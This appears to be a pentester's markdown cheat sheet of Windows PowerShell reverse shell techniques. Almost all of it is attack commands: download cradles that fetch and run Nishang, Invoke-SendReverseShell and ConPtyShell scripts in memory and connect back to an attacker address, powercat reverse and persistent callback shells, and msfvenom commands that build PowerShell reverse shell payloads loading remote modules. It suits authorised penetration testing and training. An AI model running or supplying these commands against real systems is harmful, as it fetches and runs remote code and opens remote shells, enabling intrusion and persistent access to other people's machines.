# PowerShell

## 01 - Nishang

### 1.1 - TCP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

### 1.2 - UDP Method

Download cradle through memory.

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

### 1.3 - ICMP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1')

Invoke-PowerShellIcmp -IPAddress <attacker_IP>
```

## 02 - `Invoke-SendReverseShell`

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arno0x/PowerShellScripts/refs/heads/master/Invoke-SendReverseShell.ps1')
```

Direct connection.

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT>
```

Connection through system's default proxy.

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -UseDefaultProxy
```

Connection through manually specified proxy

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -ProxyName <HTTP_proxy_IP> -ProxyPort <HTTP_proxy_PORT>
```

## 03 - Generate via `powercat`

Generate reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -g
```

Generate base64 encoded reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -ge
```

Persist callback shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -rep
```

## 04 - Generate via `msfvenom`

### 4.1 - x86 (32-bit) Payloads

```
$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o implant.bat
```

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1

$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
```

### 4.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x64.ps1
```

## 05 - Fully Interactive PowerShell

^d57486

### 5.1 - Method One

This will set the terminal size automatically without passing the `rows` and `cols` manually.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_IP> <attacker_PORT>
```

### 5.2 - Method Two

When you encounter an problem to ensure that the `cols` and `rows` are set manually. Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <attacker_IP> -RemotePort <attacker_PORT> -Rows <rows> -Cols <columns>
```

### 5.3 - Method Three

Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows <rows> -Cols <columns>
```

---
## References

### Github

- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [samratashok: Nishang](https://github.com/samratashok/nishang)

- [Arno0x: PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)

- [besimorhino: Powercat](https://github.com/besimorhino/powercat)

- [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

### Hacktricks

- [Hacktricks: Shell Windows](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)

### Ironhackers

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)